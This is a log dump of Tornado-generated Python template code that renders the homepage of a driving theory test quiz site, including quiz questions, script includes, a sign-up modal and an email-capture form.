400      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
401      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
402      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
403      _append(_tmp)  # home.html:21 (via base.html:76)
404      _append('}]\'>\n</div>\n<div id="answers" data-answers=\'[]\'></div>\n<div id="mini-quiz-box" class="undimmed">\n')  # home.html:25 (via base.html:76)
405      question = kwargs['questions'][0]  # home.html:25 (via base.html:76)
406      _append('\n<h4> ')  # home.html:26 (via base.html:76)
407      _tmp = question.question  # home.html:26 (via base.html:76)
408      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:26 (via base.html:76)
409      else: _tmp = _utf8(str(_tmp))  # home.html:26 (via base.html:76)
410      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:26 (via base.html:76)
411      _append(_tmp)  # home.html:26 (via base.html:76)
412      _append('</h4>\n<ul remaining-answers=')  # home.html:27 (via base.html:76)
413      _tmp = len(question.answer)  # home.html:27 (via base.html:76)
414      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:27 (via base.html:76)
415      else: _tmp = _utf8(str(_tmp))  # home.html:27 (via base.html:76)
416      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:27 (via base.html:76)
417      _append(_tmp)  # home.html:27 (via base.html:76)
418      _append(' class="nav nav-pills nav-stacked">\n<li><a class="choice" ind="0"><span class="badge badge-info">A</span> ')  # home.html:28 (via base.html:76)
419      _tmp = question.options[0]  # home.html:28 (via base.html:76)
420      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:28 (via base.html:76)
421      else: _tmp = _utf8(str(_tmp))  # home.html:28 (via base.html:76)
422      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:28 (via base.html:76)
423      _append(_tmp)  # home.html:28 (via base.html:76)
424      _append('</a></li>\n<li><a class="choice" ind="1"><span class="badge badge-info">B</span> ')  # home.html:29 (via base.html:76)
425      _tmp = question.options[1]  # home.html:29 (via base.html:76)
426      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:29 (via base.html:76)
427      else: _tmp = _utf8(str(_tmp))  # home.html:29 (via base.html:76)
428      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:29 (via base.html:76)
429      _append(_tmp)  # home.html:29 (via base.html:76)
430      _append('</a></li>\n<li><a class="choice" ind="2"><span class="badge badge-info">C</span> ')  # home.html:30 (via base.html:76)
431      _tmp = question.options[2]  # home.html:30 (via base.html:76)
432      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:30 (via base.html:76)
433      else: _tmp = _utf8(str(_tmp))  # home.html:30 (via base.html:76)
434      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:30 (via base.html:76)
435      _append(_tmp)  # home.html:30 (via base.html:76)
436      _append('</a></li>\n<li><a class="choice" ind="3"><span class="badge badge-info">D</span> ')  # home.html:31 (via base.html:76)
437      _tmp = question.options[3]  # home.html:31 (via base.html:76)
438      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:31 (via base.html:76)
439      else: _tmp = _utf8(str(_tmp))  # home.html:31 (via base.html:76)
440      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:31 (via base.html:76)
441      _append(_tmp)  # home.html:31 (via base.html:76)
442      _append('</a></li>\n</ul>\n<a id="next" class="btn btn-success btn-mini disabled">Next Question</a>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class="row">\n<div class="span10">\n</div>\n<div class="span5 offset5">\n</br></br>\n<blockquote>\n<p>\n<h2><div class="funkytext"><font color="#ffffff">"')  # home.html:47 (via base.html:76)
443      _tmp = kwargs['tweet']  # home.html:47 (via base.html:76)
444      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:47 (via base.html:76)
445      else: _tmp = _utf8(str(_tmp))  # home.html:47 (via base.html:76)
446      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:47 (via base.html:76)
447      _append(_tmp)  # home.html:47 (via base.html:76)
448      _append('"</h2>\n<div class="funkytext">- Dave Mason, London</font></div>\n</p>\n</blockquote>\n</div>\n</div>\n</div> <!-- /container -->\n<div id="dim">\n</div>\n')  # home.html:57 (via base.html:76)
449      _append('\n')  # base.html:80
450      _tmp = xsrf_form_html()  # base.html:80
451      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80
452      else: _tmp = _utf8(str(_tmp))  # base.html:80
453      _append(_tmp)  # base.html:80
454      _append('\n')  # base.html:81
455      _append('\n<script src="')  # base.html:82 (via base.html:81)
456      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:82 (via base.html:81)
457      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:82 (via base.html:81)
458      else: _tmp = _utf8(str(_tmp))  # base.html:82 (via base.html:81)
459      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:82 (via base.html:81)
460      _append(_tmp)  # base.html:82 (via base.html:81)
461      _append('"></script>\n<script src="')  # base.html:83 (via base.html:81)
462      _tmp = static_url('js/libs/blurb.min.js')  # base.html:83 (via base.html:81)
463      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:83 (via base.html:81)
464      else: _tmp = _utf8(str(_tmp))  # base.html:83 (via base.html:81)
465      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:83 (via base.html:81)
466      _append(_tmp)  # base.html:83 (via base.html:81)
467      _append('"></script>\n<script src="')  # base.html:84 (via base.html:81)
468      _tmp = static_url('js/IT.js')  # base.html:84 (via base.html:81)
469      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:84 (via base.html:81)
470      else: _tmp = _utf8(str(_tmp))  # base.html:84 (via base.html:81)
471      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:84 (via base.html:81)
472      _append(_tmp)  # base.html:84 (via base.html:81)
473      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:88 (via base.html:81)
474      _append('\n')  # base.html:90
475      for js in kwargs['js_deps']:  # base.html:90
476          _append('\n<script src="')  # base.html:91
477          _tmp = static_url(js)  # base.html:91
478          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:91
479          else: _tmp = _utf8(str(_tmp))  # base.html:91
480          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:91
481          _append(_tmp)  # base.html:91
482          _append('"></script>\n')  # base.html:92
483      _append('\n')  # base.html:94
484      _append('\n<script id="signup-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<p>You still need a little practice, but don\'t worry we\'re here to help you pass. Sign-up today to get started...</p>\n<a href="/login"><center><img src="')  # home.html:68 (via base.html:94)
485      _tmp = static_url('imgs/facebook.png')  # home.html:68 (via base.html:94)
486      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:68 (via base.html:94)
487      else: _tmp = _utf8(str(_tmp))  # home.html:68 (via base.html:94)
488      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:68 (via base.html:94)
489      _append(_tmp)  # home.html:68 (via base.html:94)
490      _append('" alt="some_text"/></a>\n<img src="')  # home.html:69 (via base.html:94)
491      _tmp = static_url('imgs/twitter.png')  # home.html:69 (via base.html:94)
492      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:69 (via base.html:94)
493      else: _tmp = _utf8(str(_tmp))  # home.html:69 (via base.html:94)
494      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:69 (via base.html:94)
495      _append(_tmp)  # home.html:69 (via base.html:94)
496      _append('" alt="some_text"/>\n<img src="')  # home.html:70 (via base.html:94)
497      _tmp = static_url('imgs/google.png')  # home.html:70 (via base.html:94)
498      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:70 (via base.html:94)
499      else: _tmp = _utf8(str(_tmp))  # home.html:70 (via base.html:94)
500      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:70 (via base.html:94)
501      _append(_tmp)  # home.html:70 (via base.html:94)
502      _append('" alt="some_text"/></center>\n<center><a href="h">Or click here to sign-up directly</a></center>\n</div>\n<div class="modal-footer">\n<ul class="pager">\n<li class="previous"><a href="#">Sign in to InTheory</a></li>\n<li class="next"><a href="#">Forgot username or password?</a></li>\n</ul>\n</div>\n</div>\n</script>\n<script id="show-arrow-template" type="text/x-jquery-tmpl">\n<div class="arrow-container">\n<img src="')  # home.html:84 (via base.html:94)
503      _tmp = static_url('imgs/arrow.png')  # home.html:84 (via base.html:94)
504      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:84 (via base.html:94)
505      else: _tmp = _utf8(str(_tmp))  # home.html:84 (via base.html:94)
506      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:84 (via base.html:94)
507      _append(_tmp)  # home.html:84 (via base.html:94)
508      _append('"/>\n</div>\n</script>\n<script id="email-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<center>\n<p>Leave your email and we\'ll let you know when we launch!</p>\n<form method="post" class="af-form-wrapper" action="http://www.aweber.com/scripts/addlead.pl" >\n<div style="display: none;">\n<input type="hidden" name="meta_web_form_id" value="677441365" />\n<input type="hidden" name="meta_split_id" value="" />\n<input type="hidden" name="listname" value="intheory" />\n<input type="hidden" name="redirect" value="http://www.aweber.com/thankyou-coi.htm?m=video" id="redirect_b3be9783c304109a8d9d9ca013e7b651" />\n<input type="hidden" name="meta_adtracking" value="Waiting_List_/_Splash" />\n<input type="hidden" name="meta_message" value="1" />\n<input type="hidden" name="meta_required" value="name,email" />\n<input type="hidden" name="meta_tooltip" value="" />\n</div>\n<div id="af-form-677441365" class="af-form"><div id="af-body-677441365" class="af-body af-standards">\n<div class="af-element">\n<div class="af-textWrap"></br>\n<input id="awf_field-39151245" type="text" name="name" class="text" placeholder="Enter Your Name" tabindex="500" />\n</div>\n<div class="af-clear"></div></div>\n<div class="af-element">\n<div class="af-textWrap"><input class="text" id="awf_field-39151246" type="text" name="email" placeholder="Enter Your Email" tabindex="501" />\n</div><div class="af-clear"></div>\n</div>\n<input name="submit" class="btn btn-primaryw" type="submit" value="Submit" tabindex="502" />\n</br>\n<a href="/login">or connect with Facebook</a>\n</div>\n</br></br>\n<div class="af-element privacyPolicy" style="text-align: center"><p>We respect your <a title="Privacy Policy" href="http://www.aweber.com/permission.htm" target="_blank">email privacy</a></p>\n<div class="af-clear"></div>\n</div>\n</div>\n</div>\n<div style="display: none;"><img src="http://forms.aweber.com/form/displays.htm?id=bOzsLCyMzGys" alt="" /></div>\n</form>\n</center>\n<script type="text/javascript">\n<!--\n(function() {\nvar IE = /*@cc_on!@*/false;\nif (!IE) { return; }\nif (document.compatMode && document.compatMode == \'BackCompat\') {\nif (document.getElementById("af-form-677441365")) {\ndocument.getElementById("af-form-677441365").className = \'af-form af-quirksMode\';\n}\nif (document.getElementById("af-body-677441365")) {\ndocument.getElementById("af-body-677441365").className = "af-body inline af-quirksMode";\n}\nif (document.getElementById("af-header-677441365")) {\ndocument.getElementById("af-header-677441365").className = "af-header af-quirksMode";\n}\nif (document.getElementById("af-footer-677441365")) {\ndocument.getElementById("af-footer-677441365").className = "af-footer af-quirksMode";\n}\n}\n})();\n-->\n</script>\n</div>\n</div>\n</script>\n')  # home.html:158 (via base.html:94)
509      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:106
510      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:home.html code:
  1  def _execute():  # base.html:0
  2      _buffer = []  # base.html:0
  3      _append = _buffer.append  # base.html:0
  4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
  5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
  6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
  7      _tmp = static_url('css/base.css')  # base.html:25
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
  9      else: _tmp = _utf8(str(_tmp))  # base.html:25
 10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
 11      _append(_tmp)  # base.html:25
 12      _append('" />\n')  # base.html:26
 13      for css in kwargs['css_deps']:  # base.html:26
 14          _append('\n<link href="')  # base.html:27
 15          _tmp = static_url(css)  # base.html:27
 16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
 17          else: _tmp = _utf8(str(_tmp))  # base.html:27
 18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
 19          _append(_tmp)  # base.html:27
 20          _append('" rel="stylesheet">\n')  # base.html:28
 21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n</head>\n<body >\n')  # base.html:44
 22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:53 (via base.html:44)
 23      _tmp = static_url('imgs/logo.png')  # base.html:53 (via base.html:44)
 24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:53 (via base.html:44)
 25      else: _tmp = _utf8(str(_tmp))  # base.html:53 (via base.html:44)
 26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:53 (via base.html:44)
 27      _append(_tmp)  # base.html:53 (via base.html:44)
 28      _append('"></a>\n<div class="pull-right">\n')  # base.html:55 (via base.html:44)
 29      if not current_user:  # base.html:55 (via base.html:44)
 30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:57 (via base.html:44)
 31      else:  # base.html:57 (via base.html:44)
 32          _append('\n<ul class="nav nav-pills">\n')  # base.html:59 (via base.html:44)
 33          if current_user['moderator']:  # base.html:59 (via base.html:44)
 34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:61 (via base.html:44)
 35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:68 (via base.html:44)
 36          _tmp = static_url('imgs/user.png')  # base.html:68 (via base.html:44)
 37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:68 (via base.html:44)
 38          else: _tmp = _utf8(str(_tmp))  # base.html:68 (via base.html:44)
 39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:68 (via base.html:44)
 40          _append(_tmp)  # base.html:68 (via base.html:44)
 41          _append('"></a>\n')  # base.html:69 (via base.html:44)
 42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:74 (via base.html:44)
 43      _append('\n')  # base.html:76
 44      _append('\n<div class="container">\n<div class="hero-unit">\n<div class="hero-unit1">\n<div class="row-fluid">\n<div class="columnA pull-left">\n<h2>Pass your theory test.<br>Guaranteed.</h2>\n<ul>\n<li>The simplest and fastest way to pass your test.</li>\n<li>Use cool new learning techniques to help you remember the details.</li>\n<li>Don\'t pass first time? Get your money back.</li>\n</ul></br>\n<p><a id="get-started-btn" class="btn btn-block btn-success btn-large">Get Started Today</a></p>\n</div>\n<div class="columnB pull-right">\n</br>\n<div id="questions" data-questions=\n\'[{ "question":"')  # home.html:21 (via base.html:76)
 45      _tmp = kwargs["questions"][0].question  # home.html:21 (via base.html:76)
 46      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 47      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 48      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 49      _append(_tmp)  # home.html:21 (via base.html:76)
 50      _append('","options": ["')  # home.html:21 (via base.html:76)
 51      _tmp = kwargs["questions"][0].options[0]  # home.html:21 (via base.html:76)
 52      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 53      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 54      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 55      _append(_tmp)  # home.html:21 (via base.html:76)
 56      _append('", "')  # home.html:21 (via base.html:76)
 57      _tmp = kwargs["questions"][0].options[1]  # home.html:21 (via base.html:76)
 58      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 59      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 60      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 61      _append(_tmp)  # home.html:21 (via base.html:76)
 62      _append('", "')  # home.html:21 (via base.html:76)
 63      _tmp = kwargs["questions"][0].options[2]  # home.html:21 (via base.html:76)
 64      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 65      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 66      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 67      _append(_tmp)  # home.html:21 (via base.html:76)
 68      _append('", "')  # home.html:21 (via base.html:76)
 69      _tmp = kwargs["questions"][0].options[3]  # home.html:21 (via base.html:76)
 70      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 71      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 72      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 73      _append(_tmp)  # home.html:21 (via base.html:76)
 74      _append('"],"answer": ')  # home.html:21 (via base.html:76)
 75      _tmp = kwargs["questions"][0].answer  # home.html:21 (via base.html:76)
 76      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 77      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 78      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 79      _append(_tmp)  # home.html:21 (via base.html:76)
 80      _append('},{ "question":"')  # home.html:21 (via base.html:76)
 81      _tmp = kwargs["questions"][1].question  # home.html:21 (via base.html:76)
 82      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 83      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 84      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 85      _append(_tmp)  # home.html:21 (via base.html:76)
 86      _append('","options": ["')  # home.html:21 (via base.html:76)
 87      _tmp = kwargs["questions"][1].options[0]  # home.html:21 (via base.html:76)
 88      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 89      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 90      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 91      _append(_tmp)  # home.html:21 (via base.html:76)
 92      _append('", "')  # home.html:21 (via base.html:76)
 93      _tmp = kwargs["questions"][1].options[1]  # home.html:21 (via base.html:76)
 94      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 95      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 96      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 97      _append(_tmp)  # home.html:21 (via base.html:76)
 98      _append('", "')  # home.html:21 (via base.html:76)
 99      _tmp = kwargs["questions"][1].options[2]  # home.html:21 (via base.html:76)
100      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
101      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
102      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
103      _append(_tmp)  # home.html:21 (via base.html:76)
104      _append('", "')  # home.html:21 (via base.html:76)
105      _tmp = kwargs["questions"][1].options[3]  # home.html:21 (via base.html:76)
106      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
107      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
108      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
109      _append(_tmp)  # home.html:21 (via base.html:76)
110      _append('"],"answer": ')  # home.html:21 (via base.html:76)
111      _tmp = kwargs["questions"][1].answer  # home.html:21 (via base.html:76)
112      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
113      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
114      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
115      _append(_tmp)  # home.html:21 (via base.html:76)
116      _append('}, { "question":"')  # home.html:21 (via base.html:76)
117      _tmp = kwargs["questions"][2].question  # home.html:21 (via base.html:76)
118      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
119      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
120      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
121      _append(_tmp)  # home.html:21 (via base.html:76)
122      _append('","options": ["')  # home.html:21 (via base.html:76)
123      _tmp = kwargs["questions"][2].options[0]  # home.html:21 (via base.html:76)
124      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
125      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
126      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
127      _append(_tmp)  # home.html:21 (via base.html:76)
128      _append('", "')  # home.html:21 (via base.html:76)
129      _tmp = kwargs["questions"][2].options[1]  # home.html:21 (via base.html:76)
130      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
131      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
132      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
133      _append(_tmp)  # home.html:21 (via base.html:76)
134      _append('", "')  # home.html:21 (via base.html:76)
135      _tmp = kwargs["questions"][2].options[2]  # home.html:21 (via base.html:76)
136      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
137      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
138      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
139      _append(_tmp)  # home.html:21 (via base.html:76)
140      _append('", "')  # home.html:21 (via base.html:76)
141      _tmp = kwargs["questions"][2].options[3]  # home.html:21 (via base.html:76)
142      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
143      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
144      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
145      _append(_tmp)  # home.html:21 (via base.html:76)
146      _append('"],"answer": ')  # home.html:21 (via base.html:76)
147      _tmp = kwargs["questions"][2].answer  # home.html:21 (via base.html:76)
148      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
149      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
150      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
151      _append(_tmp)  # home.html:21 (via base.html:76)
152      _append('},{ "question":"')  # home.html:21 (via base.html:76)
153      _tmp = kwargs["questions"][3].question  # home.html:21 (via base.html:76)
154      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
155      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
156      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
157      _append(_tmp)  # home.html:21 (via base.html:76)
158      _append('","options": ["')  # home.html:21 (via base.html:76)
159      _tmp = kwargs["questions"][3].options[0]  # home.html:21 (via base.html:76)
160      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
161      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
162      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
163      _append(_tmp)  # home.html:21 (via base.html:76)
164      _append('", "')  # home.html:21 (via base.html:76)
165      _tmp = kwargs["questions"][3].options[1]  # home.html:21 (via base.html:76)
166      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
167      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
168      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
169      _append(_tmp)  # home.html:21 (via base.html:76)
170      _append('", "')  # home.html:21 (via base.html:76)
171      _tmp = kwargs["questions"][3].options[2]  # home.html:21 (via base.html:76)
172      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
173      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
174      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
175      _append(_tmp)  # home.html:21 (via base.html:76)
176      _append('", "')  # home.html:21 (via base.html:76)
177      _tmp = kwargs["questions"][3].options[3]  # home.html:21 (via base.html:76)
178      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
179      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
180      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
181      _append(_tmp)  # home.html:21 (via base.html:76)
182      _append('"],"answer": ')  # home.html:21 (via base.html:76)
183      _tmp = kwargs["questions"][3].answer  # home.html:21 (via base.html:76)
184      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
185      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
186      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
187      _append(_tmp)  # home.html:21 (via base.html:76)
188      _append('}, { "question":"')  # home.html:21 (via base.html:76)
189      _tmp = kwargs["questions"][4].question  # home.html:21 (via base.html:76)
190      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
191      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
192      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
193      _append(_tmp)  # home.html:21 (via base.html:76)
194      _append('","options": ["')  # home.html:21 (via base.html:76)
195      _tmp = kwargs["questions"][4].options[0]  # home.html:21 (via base.html:76)
196      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
197      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
198      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
199      _append(_tmp)  # home.html:21 (via base.html:76)
200      _append('", "')  # home.html:21 (via base.html:76)
201      _tmp = kwargs["questions"][4].options[1]  # home.html:21 (via base.html:76)
202      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
203      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
204      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
205      _append(_tmp)  # home.html:21 (via base.html:76)
206      _append('", "')  # home.html:21 (via base.html:76)
207      _tmp = kwargs["questions"][4].options[2]  # home.html:21 (via base.html:76)
208      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
